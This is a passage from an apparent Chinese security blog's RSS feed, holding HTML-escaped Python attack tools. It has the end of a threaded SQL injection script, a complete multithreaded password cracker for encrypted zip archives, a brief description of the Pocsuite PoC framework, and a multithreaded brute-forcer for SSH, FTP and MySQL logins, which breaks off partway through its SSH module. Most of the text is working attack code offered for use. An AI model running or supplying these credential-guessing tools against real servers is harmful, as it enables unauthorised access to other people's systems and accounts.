&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sqli &lt;span style="color:#f92672">=&lt;/span> Sqli(server, target)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sqli&lt;span style="color:#f92672">.&lt;/span>start()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sqli&lt;span style="color:#f92672">.&lt;/span>join()
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>Python 爆破 zip 压缩包</title><link>https://wyb0.com/posts/2016/python-blasting-zip-archive/</link><pubDate>Tue, 20 Sep 2016 14:50:59 +0000</pubDate><guid>https://wyb0.com/posts/2016/python-blasting-zip-archive/</guid><description>&lt;h3 id="0x00-代码">0x00 代码&lt;/h3>
&lt;p>多线程爆破加密的zip压缩包&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#!/usr/bin/env python&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># -*- coding: utf-8 -*-&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> sys
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> optparse
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> zipfile
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> threading
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> Queue
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>queue &lt;span style="color:#f92672">=&lt;/span> Queue&lt;span style="color:#f92672">.&lt;/span>Queue()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>lock &lt;span style="color:#f92672">=&lt;/span> threading&lt;span style="color:#f92672">.&lt;/span>Lock()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>result &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">load_pwd&lt;/span>(filename):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> line &lt;span style="color:#f92672">in&lt;/span> open(filename,&lt;span style="color:#e6db74">&amp;#39;r&amp;#39;&lt;/span>):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> line:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> queue&lt;span style="color:#f92672">.&lt;/span>put(line&lt;span style="color:#f92672">.&lt;/span>strip())
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">bruter&lt;/span>(zipname,queue):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">global&lt;/span> result
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> zFile &lt;span style="color:#f92672">=&lt;/span> zipfile&lt;span style="color:#f92672">.&lt;/span>ZipFile(zipname)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">while&lt;/span> &lt;span style="color:#f92672">not&lt;/span> queue&lt;span style="color:#f92672">.&lt;/span>empty():
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> password &lt;span style="color:#f92672">=&lt;/span> queue&lt;span style="color:#f92672">.&lt;/span>get()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">try&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> zFile&lt;span style="color:#f92672">.&lt;/span>extractall(pwd&lt;span style="color:#f92672">=&lt;/span>password) &lt;span style="color:#75715e"># 解压&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> lock&lt;span style="color:#f92672">.&lt;/span>acquire()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print &lt;span style="color:#e6db74">&amp;#34;[Ok] password is: &lt;/span>&lt;span style="color:#e6db74">%s&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> password
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> lock&lt;span style="color:#f92672">.&lt;/span>release()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> result &lt;span style="color:#f92672">=&lt;/span> password
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">except&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> lock&lt;span style="color:#f92672">.&lt;/span>acquire()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print &lt;span style="color:#e6db74">&amp;#34;[Error] password not is: &lt;/span>&lt;span style="color:#e6db74">%s&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> password
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> lock&lt;span style="color:#f92672">.&lt;/span>release()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> queue&lt;span style="color:#f92672">.&lt;/span>task_done()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>():
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> parser &lt;span style="color:#f92672">=&lt;/span> optparse&lt;span style="color:#f92672">.&lt;/span>OptionParser()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> parser&lt;span style="color:#f92672">.&lt;/span>add_option(&lt;span style="color:#e6db74">&amp;#39;-f&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;--file&amp;#39;&lt;/span>, dest&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;zipfile&amp;#39;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> type&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;string&amp;#39;&lt;/span>, help&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;Target zip file.&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> parser&lt;span style="color:#f92672">.&lt;/span>add_option(&lt;span style="color:#e6db74">&amp;#39;-p&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;--pfile&amp;#39;&lt;/span>, dest&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;pwdfile&amp;#39;&lt;/span>,default&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;pass.txt&amp;#39;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> type&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;string&amp;#39;&lt;/span>, help&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;Password file.&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> parser&lt;span style="color:#f92672">.&lt;/span>add_option(&lt;span style="color:#e6db74">&amp;#39;-t&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;--thread_num&amp;#39;&lt;/span>, dest&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;thread_num&amp;#39;&lt;/span>,default&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">60&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> type&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;int&amp;#39;&lt;/span>, help&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;Thread number.&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> (options, args) &lt;span style="color:#f92672">=&lt;/span> parser&lt;span style="color:#f92672">.&lt;/span>parse_args()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> options&lt;span style="color:#f92672">.&lt;/span>zipfile &lt;span style="color:#f92672">and&lt;/span> options&lt;span style="color:#f92672">.&lt;/span>pwdfile:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> load_pwd(options&lt;span style="color:#f92672">.&lt;/span>pwdfile)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> parser&lt;span style="color:#f92672">.&lt;/span>print_help()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sys&lt;span style="color:#f92672">.&lt;/span>exit(&lt;span style="color:#ae81ff">0&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> threads &lt;span style="color:#f92672">=&lt;/span> []
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> x &lt;span style="color:#f92672">in&lt;/span> range(options&lt;span style="color:#f92672">.&lt;/span>thread_num):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> t &lt;span style="color:#f92672">=&lt;/span> threading&lt;span style="color:#f92672">.&lt;/span>Thread(target&lt;span style="color:#f92672">=&lt;/span>bruter,args&lt;span style="color:#f92672">=&lt;/span>(options&lt;span style="color:#f92672">.&lt;/span>zipfile,queue,))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> t&lt;span style="color:#f92672">.&lt;/span>setDaemon(&lt;span style="color:#66d9ef">True&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> t&lt;span style="color:#f92672">.&lt;/span>start()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> queue&lt;span style="color:#f92672">.&lt;/span>join()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print &lt;span style="color:#e6db74">&amp;#34;result is: &lt;/span>&lt;span style="color:#e6db74">%s&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> result
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">if&lt;/span> __name__ &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#39;__main__&amp;#39;&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> main()
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>POC 框架 Pocsuite</title><link>https://wyb0.com/posts/2016/poc-framework-pocsuite/</link><pubDate>Thu, 08 Sep 2016 20:38:45 +0000</pubDate><guid>https://wyb0.com/posts/2016/poc-framework-pocsuite/</guid><description>&lt;h3 id="0x00-关于pocsuite">0x00 关于Pocsuite&lt;/h3>
&lt;p>Pocsuite 是知道创宇安全研究团队打造的一款基于漏洞与 POC 的远程漏洞验证框架。可以让我们不用考虑过多的细节，只要考虑验证代码就可以，它封装了一些我们常用的东西，比如requests，在我们平常使用requests是要考虑cookie、要考虑header，但是在框架下则不需要有这些考虑，因为这些东西框架都帮你解决了。&lt;/p></description></item><item><title>Python 实现多线程弱口令爆破</title><link>https://wyb0.com/posts/2016/python-multi-threaded-weak-password-blasting/</link><pubDate>Fri, 26 Aug 2016 17:53:51 +0000</pubDate><guid>https://wyb0.com/posts/2016/python-multi-threaded-weak-password-blasting/</guid><description>&lt;h3 id="0x00-脚本">0x00 脚本&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#!/usr/bin/env python&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># -*- coding: utf-8 -*-&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">&amp;#39;this script can bruter ftp/ssh/mysql&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>__author__ &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;reber&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> Queue
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> threading
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> time
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> logging
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> socket
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> optparse &lt;span style="color:#f92672">import&lt;/span> OptionParser
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> paramiko
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> ftplib &lt;span style="color:#f92672">import&lt;/span> FTP
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> MySQLdb
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#################公有类#################&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">CommonFun&lt;/span>(object):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;&amp;#34;&amp;#34;docstring for CommonFun&amp;#34;&amp;#34;&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">def&lt;/span> __init__(self):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> super(CommonFun, self)&lt;span style="color:#f92672">.&lt;/span>__init__()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">set_log&lt;/span>(self,lname):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> logger &lt;span style="color:#f92672">=&lt;/span> logging&lt;span style="color:#f92672">.&lt;/span>getLogger(lname)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> logger&lt;span style="color:#f92672">.&lt;/span>setLevel(logging&lt;span style="color:#f92672">.&lt;/span>DEBUG)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ch &lt;span style="color:#f92672">=&lt;/span> logging&lt;span style="color:#f92672">.&lt;/span>StreamHandler()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ch&lt;span style="color:#f92672">.&lt;/span>setLevel(logging&lt;span style="color:#f92672">.&lt;/span>DEBUG)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> formatter &lt;span style="color:#f92672">=&lt;/span> logging&lt;span style="color:#f92672">.&lt;/span>Formatter(&lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#e6db74">%(asctime)s&lt;/span>&lt;span style="color:#e6db74"> - &lt;/span>&lt;span style="color:#e6db74">%(name)s&lt;/span>&lt;span style="color:#e6db74"> - &lt;/span>&lt;span style="color:#e6db74">%(levelname)s&lt;/span>&lt;span style="color:#e6db74"> - &lt;/span>&lt;span style="color:#e6db74">%(message)s&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ch&lt;span style="color:#f92672">.&lt;/span>setFormatter(formatter)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> logger&lt;span style="color:#f92672">.&lt;/span>addHandler(ch)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">show_log&lt;/span>(self, lname, msg):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> a &lt;span style="color:#f92672">=&lt;/span> logging&lt;span style="color:#f92672">.&lt;/span>getLogger(lname)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> a&lt;span style="color:#f92672">.&lt;/span>debug(msg)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">show_result&lt;/span>(self, lname, rlist):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> rlist:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print &lt;span style="color:#e6db74">&amp;#34;###################################################################&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> x &lt;span style="color:#f92672">in&lt;/span> rlist:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>show_log(lname,x)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print &lt;span style="color:#e6db74">&amp;#34;not found...&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#################SSH爆破模块#################&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">SshBruter&lt;/span>(CommonFun):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;&amp;#34;&amp;#34;docstring for SshBruter&amp;#34;&amp;#34;&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">def&lt;/span> __init__(self, &lt;span style="color:#f92672">*&lt;/span>args):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> super(SshBruter, self)&lt;span style="color:#f92672">.&lt;/span>__init__()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> (options,arg) &lt;span style="color:#f92672">=&lt;/span> args
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>host &lt;span style="color:#f92672">=&lt;/span> options&lt;span style="color:#f92672">.&lt;/span>host
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>userfile &lt;span style="color:#f92672">=&lt;/span> options&lt;span style="color:#f92672">.&lt;/span>userfile
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>passfile &lt;span style="color:#f92672">=&lt;/span> options&lt;span style="color:#f92672">.&lt;/span>passfile
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>threadnum &lt;span style="color:#f92672">=&lt;/span> options&lt;span style="color:#f92672">.&lt;/span>threadnum
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>timeout &lt;span style="color:#f92672">=&lt;/span> options&lt;span style="color:#f92672">.&lt;/span>timeout
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>result &lt;span style="color:#f92672">=&lt;/span> []
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>set_log(self&lt;span style="color:#f92672">.&lt;/span>host)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>qlist &lt;span style="color:#f92672">=&lt;/span> Queue&lt;span style="color:#f92672">.&lt;/span>Queue()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>is_exit &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">False&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print self&lt;span style="color:#f92672">.&lt;/span>host,self&lt;span style="color:#f92672">.&lt;/span>userfile,self&lt;span style="color:#f92672">.&lt;/span>passfile,self&lt;span style="color:#f92672">.&lt;/span>threadnum
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">get_queue&lt;/span>(self):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">with&lt;/span> open(self&lt;span style="color:#f92672">.&lt;/span>userfile, &lt;span style="color:#e6db74">&amp;#39;r&amp;#39;&lt;/span>) &lt;span style="color:#66d9ef">as&lt;/span> f:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ulines &lt;span style="color:#f92672">=&lt;/span> f&lt;span style="color:#f92672">.&lt;/span>readlines()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">with&lt;/span> open(self&lt;span style="color:#f92672">.&lt;/span>passfile, &lt;span style="color:#e6db74">&amp;#39;r&amp;#39;&lt;/span>) &lt;span style="color:#66d9ef">as&lt;/span> f:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> plines &lt;span style="color:#f92672">=&lt;/span> f&lt;span style="color:#f92672">.&lt;/span>readlines()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> name &lt;span style="color:#f92672">in&lt;/span> ulines:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> pwd &lt;span style="color:#f92672">in&lt;/span> plines:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> name &lt;span style="color:#f92672">=&lt;/span> name&lt;span style="color:#f92672">.&lt;/span>strip()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> pwd &lt;span style="color:#f92672">=&lt;/span> pwd&lt;span style="color:#f92672">.&lt;/span>strip()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>qlist&lt;span style="color:#f92672">.&lt;/span>put(name &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#39;:&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> pwd)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">thread&lt;/span>(self): 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">while&lt;/span> &lt;span style="color:#f92672">not&lt;/span> self&lt;span style="color:#f92672">.&lt;/span>qlist&lt;span style="color:#f92672">.&lt;/span>empty():
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">not&lt;/span> self&lt;span style="color:#f92672">.&lt;/span>is_exit:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> name,pwd &lt;span style="color:#f92672">=&lt;/span> self&lt;span style="color:#f92672">.&lt;/span>qlist&lt;span style="color:#f92672">.&lt;/span>get()&lt;span style="color:#f92672">.&lt;/span>split(&lt;span style="color:#e6db74">&amp;#39;:&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">try&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ssh &lt;span style="color:#f92672">=&lt;/span> paramiko&lt;span style="color:#f92672">.&lt;/span>SSHClient()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ssh&lt;span style="color:#f92672">.&lt;/span>set_missing_host_key_policy(paramiko&lt;span style="color:#f92672">.&lt;/span>AutoAddPolicy())
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ssh&lt;span style="color:#f92672">.&lt;/span>connect(hostname&lt;span style="color:#f92672">=&lt;/span>self&lt;span style="color:#f92672">.&lt;/span>host,port&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">22&lt;/span>,username&lt;span style="color:#f92672">=&lt;/span>name,password&lt;span style="color:#f92672">=&lt;/span>pwd,timeout&lt;span style="color:#f92672">=&lt;/span>self&lt;span style="color:#f92672">.&lt;/span>timeout)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> time&lt;span style="color:#f92672">.&lt;/span>sleep(&lt;span style="color:#ae81ff">0.05&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ssh&lt;span style="color:#f92672">.&lt;/span>close()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> s &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;[OK] &lt;/span>&lt;span style="color:#e6db74">%s&lt;/span>&lt;span style="color:#e6db74">:&lt;/span>&lt;span style="color:#e6db74">%s&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> (name,pwd)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>show_log(self&lt;span style="color:#f92672">.&lt;/span>host,s)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>result&lt;span style="color:#f92672">.&lt;/span>append(s)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">except&lt;/span> socket&lt;span style="color:#f92672">.&lt;/span>timeout:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>show_log(self&lt;span style="color:#f92672">.&lt;/span>host,&lt;span style="color:#e6db74">&amp;#34;Timeout...&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>qlist&lt;span style="color:#f92672">.&lt;/span>put(name &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#39;:&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> pwd)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> time&lt;span style="color:#f92672">.&lt;/span>sleep(&lt;span style="color:#ae81ff">3&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">except&lt;/span> &lt;span style="color:#a6e22e">Exception&lt;/span>, e:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> error &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;[Error] &lt;/span>&lt;span style="color:#e6db74">%s&lt;/span>&lt;span style="color:#e6db74">:&lt;/span>&lt;span style="color:#e6db74">%s&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> (name,pwd)
